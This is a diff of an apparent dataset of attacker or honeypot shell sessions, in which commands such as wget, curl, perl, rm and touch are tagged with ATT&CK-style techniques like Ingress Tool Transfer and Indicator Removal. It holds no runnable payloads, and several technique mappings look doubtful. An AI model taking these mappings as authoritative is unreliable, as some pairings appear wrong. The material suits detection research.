 rm	remove files or directories	Indicator Removal
@@ -31913,37 +31634,27 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 5a81a9960ae3
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 0e14e78fd26c
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 0df31ca5daf1
 killall	kill processes by name	Process Discovery
@@ -31973,7 +31684,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: a9d29119aa92
 killall	kill processes by name	Process Discovery
 perl	The Perl 5 language interpreter	Command and Scripting Interpreter
 rm	remove files or directories	Indicator Removal
@@ -32001,7 +31712,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: f72824a74f39
 echo	display a line of text	Masquerading
 wget	The non-interactive network downloader	Ingress Tool Transfer
 curl	transfer a URL	Dynamic Resolution
@@ -32058,35 +31769,25 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: 49a23947ce49
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 8cf08636e2c1
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 7e00c135f0a8
 killall	kill processes by name	Process Discovery
@@ -32116,7 +31817,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: b5a4c3559a27
 killall	kill processes by name	Process Discovery
 perl	The Perl 5 language interpreter	Command and Scripting Interpreter
 rm	remove files or directories	Indicator Removal
@@ -32144,7 +31845,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 30ab63b72d1a
 echo	display a line of text	Masquerading
 wget	The non-interactive network downloader	Ingress Tool Transfer
 curl	transfer a URL	Dynamic Resolution
@@ -32245,7 +31946,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 388dcff6ed9e
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -32293,19 +31994,14 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: fcde4b77ad9a
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 50594aad5377
 cat	concatenate files and print on the standard output	Automated Collection
@@ -32381,7 +32077,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 971d309c9e2c
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -32484,27 +32180,20 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: 1970365a2fd8
 ls	list directory contents	File and Directory Discovery
+rm	remove files or directories	Indicator Removal
 
-- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
-rm
-
-
-
+Session ID: 4cf760b90aaf
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 99c62c6e4a1b
 echo	display a line of text	Masquerading
@@ -32563,13 +32252,11 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: 3cd12e5506d7
 ls	list directory contents	File and Directory Discovery
+rm	remove files or directories	Indicator Removal
 
-- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
-rm
-
-
-
+Session ID: e1cfaee5f835
 killall	kill processes by name	Process Discovery
 perl	The Perl 5 language interpreter	Command and Scripting Interpreter
 rm	remove files or directories	Indicator Removal
@@ -32597,21 +32284,16 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 4a1f7ec64220
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 3c35da104b3b
 cat	concatenate files and print on the standard output	Automated Collection
@@ -32687,7 +32369,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 0e005bf41b1a
 killall	kill processes by name	Process Discovery
 perl	The Perl 5 language interpreter	Command and Scripting Interpreter
 rm	remove files or directories	Indicator Removal
@@ -32715,7 +32397,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: e8e0058bdb14
 killall	kill processes by name	Process Discovery
 perl	The Perl 5 language interpreter	Command and Scripting Interpreter
 rm	remove files or directories	Indicator Removal
@@ -32743,7 +32425,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 5a1d37d0b135
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -32817,21 +32499,16 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: b85372493f22
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: cb6bebfa61e2
 killall	kill processes by name	Process Discovery
@@ -32861,21 +32538,16 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 97ce663a4b7f
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 6c032abca98a
 cat	concatenate files and print on the standard output	Automated Collection
@@ -32925,35 +32597,25 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: 3e8e0daaa373
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 6afc97b96d79
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: d5b39851cfd3
 killall	kill processes by name	Process Discovery
@@ -32983,7 +32645,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 0ff66aed0c91
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -33031,19 +32693,14 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: d77bfa6a9da5
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 5ab72cfc0127
 cat	concatenate files and print on the standard output	Automated Collection
@@ -33119,21 +32776,16 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: a1e282cbaf8c
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 2f6988754915
 killall	kill processes by name	Process Discovery
@@ -33163,7 +32815,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 18da155051ef
 killall	kill processes by name	Process Discovery
 perl	The Perl 5 language interpreter	Command and Scripting Interpreter
 rm	remove files or directories	Indicator Removal
@@ -33191,7 +32843,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 4731dbb3362f
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -33331,19 +32983,14 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: 97fd33804f59
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: a7847e30bae6
 killall	kill processes by name	Process Discovery
@@ -33373,37 +33020,27 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: b7f99b302e4e
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 45bed116f20b
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: b72121060831
 killall	kill processes by name	Process Discovery
@@ -33433,21 +33070,16 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 52cdeb8b2896
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 22881fc9cb4a
 killall	kill processes by name	Process Discovery
@@ -33477,15 +33109,13 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 9014fb3635b0
 ls	list directory contents	File and Directory Discovery
+rm	remove files or directories	Indicator Removal
 
-- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
-rm
-
-
-
+Session ID: 27722f1b34de
 killall	kill processes by name	Process Discovery
 perl	The Perl 5 language interpreter	Command and Scripting Interpreter
 rm	remove files or directories	Indicator Removal
@@ -33513,21 +33143,16 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 91495b8a80eb
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: a57657e6af62
 cat	concatenate files and print on the standard output	Automated Collection
@@ -33577,51 +33202,36 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: b732725d9aa8
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: f62dc7be7a2b
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 392a78d161a0
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: b06c2f3a9057
 killall	kill processes by name	Process Discovery
@@ -33651,7 +33261,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 86e9e74f9583
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -33725,7 +33335,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 99303f4764e8
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -33773,19 +33383,14 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: 8ce9c30ae37c
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 68d535caba05
 killall	kill processes by name	Process Discovery
@@ -33815,21 +33420,16 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: a7e46417bc08
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: cead5353491b
 killall	kill processes by name	Process Discovery
@@ -33859,7 +33459,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 3f0822daf3f6
 killall	kill processes by name	Process Discovery
 perl	The Perl 5 language interpreter	Command and Scripting Interpreter
 rm	remove files or directories	Indicator Removal
@@ -33887,37 +33487,27 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 35a6a6722eba
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: a2fbc7e8d995
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 50a8d4445fc9
 cat	concatenate files and print on the standard output	Automated Collection
@@ -33967,19 +33557,14 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: 2507869d03f9
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 1b5468dad61d
 killall	kill processes by name	Process Discovery
@@ -34009,7 +33594,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: ae320426411b
 killall	kill processes by name	Process Discovery
 perl	The Perl 5 language interpreter	Command and Scripting Interpreter
 rm	remove files or directories	Indicator Removal
@@ -34037,7 +33622,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 4563c0f785b8
 killall	kill processes by name	Process Discovery
 perl	The Perl 5 language interpreter	Command and Scripting Interpreter
 rm	remove files or directories	Indicator Removal
@@ -34065,7 +33650,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: ec6a96dcde2a
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -34113,19 +33698,14 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: 45f3b4282cec
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 060e4f5f9c36
 killall	kill processes by name	Process Discovery
@@ -34155,7 +33735,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: f86d60213e1c
 killall	kill processes by name	Process Discovery
 perl	The Perl 5 language interpreter	Command and Scripting Interpreter
 rm	remove files or directories	Indicator Removal
@@ -34183,61 +33763,44 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 8bb849dc5492
 ls	list directory contents	File and Directory Discovery
+rm	remove files or directories	Indicator Removal
 
-- Mapping:		File and Directory Discovery
+- Mapping:		Indicator Removal
 
-rm
-
-
-
+Session ID: bdfe1961f1dc
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 6f8b3ac98eee
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 5d2555c04cd3
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 246820ce25d4
 cat	concatenate files and print on the standard output	Automated Collection
@@ -34371,37 +33934,27 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: fd2386cb06a4
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 4fa8af53596c
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 27caf3defbe4
 killall	kill processes by name	Process Discovery
@@ -34431,7 +33984,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: c9d8b8c6daac
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -34505,7 +34058,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: b878cb6ee58a
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -34717,21 +34270,16 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: f787254ef142
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 7d900f2bfc9b
 cat	concatenate files and print on the standard output	Automated Collection
@@ -34827,19 +34375,14 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: b087b5a8a696
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: 292b5a6482d9
 cat	concatenate files and print on the standard output	Automated Collection
@@ -34889,19 +34432,14 @@ rm	remove files or directories	Indicator Removal
 
 Session ID: 4e725a5f2625
 ls	list directory contents	File and Directory Discovery
-
-- Mapping:		File and Directory Discovery
-
-rm
-
-
-ps
+rm	remove files or directories	Indicator Removal
+ps	report a snapshot of the current processes	Process Discovery
 dmesg	print or control the kernel ring buffer	Process Injection
 grep	print lines that match patterns	Automated Collection
 lspci	list all PCI devices	Peripheral Device Discovery
 grep	print lines that match patterns	Automated Collection
 
-- Mapping:		Virtualization/Sandbox Evasion
+- Mapping:		File and Directory Discovery
 
 Session ID: c8cdd0ca11e3
 cat	concatenate files and print on the standard output	Automated Collection
@@ -35023,7 +34561,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: f54d646dcc22
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -35189,7 +34727,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 6e368dfcd9c3
 killall	kill processes by name	Process Discovery
 perl	The Perl 5 language interpreter	Command and Scripting Interpreter
 rm	remove files or directories	Indicator Removal
@@ -35217,7 +34755,7 @@ touch	change file timestamps	Indicator Removal
 
 - Mapping:		Indicator Removal
 
-
+Session ID: 6e3f0ff4e28c
 cat	concatenate files and print on the standard output	Automated Collection
 proc	process information pseudo-filesystem	File and Directory Discovery
 grep	print lines that match patterns	Automated Collection
@@ -35264,9 +34802,7 @@ rm	remove files or directories	Indicator Removal
 - Mapping:		System Information Discovery
 
 Session ID: b5f40a93c11f
-
-
-ip
